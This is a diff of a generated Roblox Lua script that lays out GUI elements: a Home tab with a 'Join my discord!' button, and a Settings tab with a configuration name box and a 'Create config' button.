+G2L["58"]["Name"] = [[dividerFrame]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.UIPadding
-G2L["59"] = Instance.new("UIPadding", G2L["58"]);
-G2L["59"]["PaddingTop"] = UDim.new(0, 2);
-G2L["59"]["PaddingRight"] = UDim.new(0, 3);
-G2L["59"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["59"]["PaddingBottom"] = UDim.new(0, 2);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.outlineStroke
+G2L["59"] = Instance.new("UIStroke", G2L["58"]);
+G2L["59"]["Thickness"] = 2;
+G2L["59"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.buttonFrame
-G2L["5a"] = Instance.new("Frame", G2L["58"]);
-G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["5a"]["BorderMode"] = Enum.BorderMode.Inset;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.buttonFade
+G2L["5a"] = Instance.new("CanvasGroup", G2L["58"]);
+G2L["5a"]["BorderSizePixel"] = 0;
+G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5a"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["5a"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["5a"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["5a"]["Name"] = [[buttonFrame]];
+G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5a"]["Name"] = [[buttonFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.buttonFrame.outlineStroke
-G2L["5b"] = Instance.new("UIStroke", G2L["5a"]);
-G2L["5b"]["Thickness"] = 2;
-G2L["5b"]["Name"] = [[outlineStroke]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
+G2L["5b"] = Instance.new("UIGradient", G2L["5a"]);
+G2L["5b"]["Rotation"] = 90;
+G2L["5b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.buttonFrame.buttonFade
-G2L["5c"] = Instance.new("CanvasGroup", G2L["5a"]);
-G2L["5c"]["BorderSizePixel"] = 0;
-G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["5c"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["5c"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["5c"]["Name"] = [[buttonFade]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.UIStroke
+G2L["5c"] = Instance.new("UIStroke", G2L["58"]);
+G2L["5c"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["5c"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.buttonFrame.buttonFade.UIGradient
-G2L["5d"] = Instance.new("UIGradient", G2L["5c"]);
-G2L["5d"]["Rotation"] = 90;
-G2L["5d"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.UICorner
+G2L["5d"] = Instance.new("UICorner", G2L["58"]);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.text
-G2L["5e"] = Instance.new("TextLabel", G2L["58"]);
-G2L["5e"]["ZIndex"] = 2;
-G2L["5e"]["BorderSizePixel"] = 0;
-G2L["5e"]["TextSize"] = 14;
-G2L["5e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["5e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["5e"]["BackgroundTransparency"] = 1;
-G2L["5e"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["5e"]["Text"] = [[Create config]];
-G2L["5e"]["Name"] = [[text]];
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.UIPadding
+G2L["5e"] = Instance.new("UIPadding", G2L["57"]);
+G2L["5e"]["PaddingTop"] = UDim.new(0, 3);
+G2L["5e"]["PaddingRight"] = UDim.new(0, 6);
+G2L["5e"]["PaddingLeft"] = UDim.new(0, 6);
+G2L["5e"]["PaddingBottom"] = UDim.new(0, 3);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.text.text
-G2L["5f"] = Instance.new("UIStroke", G2L["5e"]);
-G2L["5f"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord
+G2L["5f"] = Instance.new("Frame", G2L["3b"]);
+G2L["5f"]["BorderSizePixel"] = 0;
+G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5f"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["5f"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5f"]["Name"] = [[discord]];
+G2L["5f"]["LayoutOrder"] = 4;
+G2L["5f"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.fillbar
-G2L["60"] = Instance.new("Frame", G2L["57"]);
-G2L["60"]["ZIndex"] = 90;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button
+G2L["60"] = Instance.new("TextButton", G2L["5f"]);
 G2L["60"]["BorderSizePixel"] = 0;
+G2L["60"]["TextTransparency"] = 1;
+G2L["60"]["TextSize"] = 14;
+G2L["60"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["60"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["60"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["60"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["60"]["ZIndex"] = 49;
+G2L["60"]["BackgroundTransparency"] = 1;
+G2L["60"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["60"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["60"]["Name"] = [[fillbar]];
-G2L["60"]["BackgroundTransparency"] = 0.95;
+G2L["60"]["Name"] = [[button]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---
-G2L["61"] = Instance.new("Frame", G2L["3e"]);
-G2L["61"]["BorderSizePixel"] = 0;
-G2L["61"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["61"]["Size"] = UDim2.new(1, 0, 0, 10);
-G2L["61"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["61"]["Name"] = [[---DIVIDER---]];
-G2L["61"]["LayoutOrder"] = 5;
-G2L["61"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.UIPadding
+G2L["61"] = Instance.new("UIPadding", G2L["60"]);
+G2L["61"]["PaddingTop"] = UDim.new(0, 2);
+G2L["61"]["PaddingRight"] = UDim.new(0, 3);
+G2L["61"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["61"]["PaddingBottom"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame
-G2L["62"] = Instance.new("Frame", G2L["61"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.buttonFrame
+G2L["62"] = Instance.new("Frame", G2L["60"]);
 G2L["62"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
 G2L["62"]["BorderMode"] = Enum.BorderMode.Inset;
 G2L["62"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["62"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["62"]["Name"] = [[dividerFrame]];
+G2L["62"]["Name"] = [[buttonFrame]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.outlineStroke
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.buttonFrame.outlineStroke
 G2L["63"] = Instance.new("UIStroke", G2L["62"]);
 G2L["63"]["Thickness"] = 2;
 G2L["63"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.buttonFade
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.buttonFrame.buttonFade
 G2L["64"] = Instance.new("CanvasGroup", G2L["62"]);
 G2L["64"]["BorderSizePixel"] = 0;
 G2L["64"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
@@ -944,1648 +920,1661 @@ G2L["64"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["64"]["Name"] = [[buttonFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.buttonFrame.buttonFade.UIGradient
 G2L["65"] = Instance.new("UIGradient", G2L["64"]);
 G2L["65"]["Rotation"] = 90;
 G2L["65"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.text
+G2L["66"] = Instance.new("TextLabel", G2L["60"]);
+G2L["66"]["ZIndex"] = 2;
+G2L["66"]["BorderSizePixel"] = 0;
+G2L["66"]["TextSize"] = 14;
+G2L["66"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["66"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["66"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["66"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["66"]["BackgroundTransparency"] = 1;
+G2L["66"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["66"]["Text"] = [[Join my discord!]];
+G2L["66"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.text.text
+G2L["67"] = Instance.new("UIStroke", G2L["66"]);
+G2L["67"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.fillbar
+G2L["68"] = Instance.new("Frame", G2L["5f"]);
+G2L["68"]["ZIndex"] = 90;
+G2L["68"]["BorderSizePixel"] = 0;
+G2L["68"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["68"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["68"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["68"]["Name"] = [[fillbar]];
+G2L["68"]["BackgroundTransparency"] = 0.95;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings
+G2L["69"] = Instance.new("ScrollingFrame", G2L["34"]);
+G2L["69"]["Visible"] = false;
+G2L["69"]["Active"] = true;
+G2L["69"]["BorderSizePixel"] = 0;
+G2L["69"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
+G2L["69"]["Name"] = [[Settings]];
+G2L["69"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["69"]["Size"] = UDim2.new(0, 360, 0, 255);
+G2L["69"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["69"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
+G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["69"]["ScrollBarThickness"] = 0;
+G2L["69"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside
+G2L["6a"] = Instance.new("Frame", G2L["69"]);
+G2L["6a"]["BorderSizePixel"] = 0;
+G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6a"]["Size"] = UDim2.new(0, 176, 0, 255);
+G2L["6a"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
+G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6a"]["Name"] = [[rightside]];
+G2L["6a"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.UIListLayout
+G2L["6b"] = Instance.new("UIListLayout", G2L["6a"]);
+G2L["6b"]["Padding"] = UDim.new(0, 5);
+G2L["6b"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab
+G2L["6c"] = Instance.new("Frame", G2L["6a"]);
+G2L["6c"]["BorderSizePixel"] = 0;
+G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
+G2L["6c"]["Size"] = UDim2.new(0, 176, 0, 160);
+G2L["6c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6c"]["Name"] = [[configTab]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.Script
+G2L["6d"] = Instance.new("LocalScript", G2L["6c"]);
+G2L["6d"]["Name"] = [[Script]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.UIListLayout
+G2L["6e"] = Instance.new("UIListLayout", G2L["6c"]);
+G2L["6e"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
+G2L["6e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.greystroke
+G2L["6f"] = Instance.new("UIStroke", G2L["6c"]);
+G2L["6f"]["ZIndex"] = 99;
+G2L["6f"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["6f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["6f"]["Name"] = [[greystroke]];
+G2L["6f"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======ACCENT======
+G2L["70"] = Instance.new("Frame", G2L["6c"]);
+G2L["70"]["BorderSizePixel"] = 0;
+G2L["70"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["70"]["Size"] = UDim2.new(1, 0, 0, 4);
+G2L["70"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["70"]["Name"] = [[======ACCENT======]];
+G2L["70"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======ACCENT======.GuiColor
+G2L["71"] = Instance.new("Frame", G2L["70"]);
+G2L["71"]["BorderSizePixel"] = 0;
+G2L["71"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["71"]["Size"] = UDim2.new(1, -2, 0, 2);
+G2L["71"]["Position"] = UDim2.new(0, 1, 0, 1);
+G2L["71"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["71"]["Name"] = [[GuiColor]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======ACCENT======.GuiColor.UICorner
+G2L["72"] = Instance.new("UICorner", G2L["71"]);
+
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======
+G2L["73"] = Instance.new("Frame", G2L["6c"]);
+G2L["73"]["BorderSizePixel"] = 0;
+G2L["73"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["73"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["73"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["73"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["73"]["Name"] = [[======TITLE======]];
+G2L["73"]["LayoutOrder"] = 1;
+G2L["73"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======.text
+G2L["74"] = Instance.new("TextLabel", G2L["73"]);
+G2L["74"]["TextWrapped"] = true;
+G2L["74"]["BorderSizePixel"] = 0;
+G2L["74"]["TextSize"] = 14;
+G2L["74"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["74"]["TextTransparency"] = 0.3;
+G2L["74"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["74"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["74"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["74"]["BackgroundTransparency"] = 1;
+G2L["74"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["74"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["74"]["Text"] = [[Configuration]];
+G2L["74"]["Name"] = [[text]];
+G2L["74"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======.text.text
+G2L["75"] = Instance.new("UIStroke", G2L["74"]);
+G2L["75"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======.text.UIPadding
+G2L["76"] = Instance.new("UIPadding", G2L["74"]);
+G2L["76"]["PaddingLeft"] = UDim.new(0, 1);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.======TITLE======.minimise
+G2L["77"] = Instance.new("TextButton", G2L["73"]);
+G2L["77"]["BorderSizePixel"] = 0;
+G2L["77"]["TextTransparency"] = 0.3;
+G2L["77"]["TextSize"] = 14;
+G2L["77"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["77"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["77"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["77"]["BackgroundTransparency"] = 1;
+G2L["77"]["Size"] = UDim2.new(0, 35, 1, 0);
+G2L["77"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["77"]["Text"] = [[-]];
+G2L["77"]["Name"] = [[minimise]];
+G2L["77"]["Position"] = UDim2.new(1, -30, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox
+G2L["78"] = Instance.new("Frame", G2L["6c"]);
+G2L["78"]["BorderSizePixel"] = 0;
+G2L["78"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["78"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["78"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["78"]["Name"] = [[configtextbox]];
+G2L["78"]["LayoutOrder"] = 3;
+G2L["78"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname
+G2L["79"] = Instance.new("Frame", G2L["78"]);
+G2L["79"]["ZIndex"] = 55;
+G2L["79"]["BorderSizePixel"] = 0;
+G2L["79"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["79"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["79"]["Name"] = [[configinputname]];
+G2L["79"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.UIPadding
+G2L["7a"] = Instance.new("UIPadding", G2L["79"]);
+G2L["7a"]["PaddingTop"] = UDim.new(0, 2);
+G2L["7a"]["PaddingRight"] = UDim.new(0, 3);
+G2L["7a"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["7a"]["PaddingBottom"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox
+G2L["7b"] = Instance.new("TextBox", G2L["79"]);
+G2L["7b"]["Name"] = [[textbox]];
+G2L["7b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["7b"]["PlaceholderColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["7b"]["TextSize"] = 14;
+G2L["7b"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["7b"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["7b"]["PlaceholderText"] = [[---]];
+G2L["7b"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["7b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["7b"]["Text"] = [[]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.outlineStroke
+G2L["7c"] = Instance.new("UIStroke", G2L["7b"]);
+G2L["7c"]["Thickness"] = 2;
+G2L["7c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["7c"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.buttonFade
+G2L["7d"] = Instance.new("CanvasGroup", G2L["7b"]);
+G2L["7d"]["BorderSizePixel"] = 0;
+G2L["7d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7d"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["7d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7d"]["Name"] = [[buttonFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.buttonFade.UIGradient
+G2L["7e"] = Instance.new("UIGradient", G2L["7d"]);
+G2L["7e"]["Rotation"] = 90;
+G2L["7e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.text
+G2L["7f"] = Instance.new("UIStroke", G2L["7b"]);
+G2L["7f"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configtextbox.configinputname.textbox.UIPadding
+G2L["80"] = Instance.new("UIPadding", G2L["7b"]);
+G2L["80"]["PaddingLeft"] = UDim.new(0, 6);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.confignameLABEL
+G2L["81"] = Instance.new("Frame", G2L["6c"]);
+G2L["81"]["BorderSizePixel"] = 0;
+G2L["81"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["81"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["81"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
+G2L["81"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["81"]["Name"] = [[confignameLABEL]];
+G2L["81"]["LayoutOrder"] = 2;
+G2L["81"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.confignameLABEL.text
+G2L["82"] = Instance.new("TextLabel", G2L["81"]);
+G2L["82"]["TextWrapped"] = true;
+G2L["82"]["ZIndex"] = 10;
+G2L["82"]["BorderSizePixel"] = 0;
+G2L["82"]["TextSize"] = 14;
+G2L["82"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["82"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["82"]["BackgroundTransparency"] = 1;
+G2L["82"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["82"]["Text"] = [[Config name]];
+G2L["82"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.confignameLABEL.text.UIPadding
+G2L["83"] = Instance.new("UIPadding", G2L["82"]);
+G2L["83"]["PaddingLeft"] = UDim.new(0, 6);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.confignameLABEL.text.text
+G2L["84"] = Instance.new("UIStroke", G2L["82"]);
+G2L["84"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig
+G2L["85"] = Instance.new("Frame", G2L["6c"]);
+G2L["85"]["BorderSizePixel"] = 0;
+G2L["85"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["85"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["85"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["85"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["85"]["Name"] = [[createconfig]];
+G2L["85"]["LayoutOrder"] = 4;
+G2L["85"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button
+G2L["86"] = Instance.new("TextButton", G2L["85"]);
+G2L["86"]["BorderSizePixel"] = 0;
+G2L["86"]["TextTransparency"] = 1;
+G2L["86"]["TextSize"] = 14;
+G2L["86"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["86"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["86"]["ZIndex"] = 49;
+G2L["86"]["BackgroundTransparency"] = 1;
+G2L["86"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["86"]["Name"] = [[button]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.createconfig.button.UIPadding
+G2L["87"] = Instance.new("UIPadding", G2L["86"]);
+G2L["87"]["PaddingTop"] = UDim.new(0, 2);
+G2L["87"]["PaddingRight"] = UDim.new(0, 3);
+G2L["87"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["87"]["PaddingBottom"] = UDim.new(0, 2);
+
+
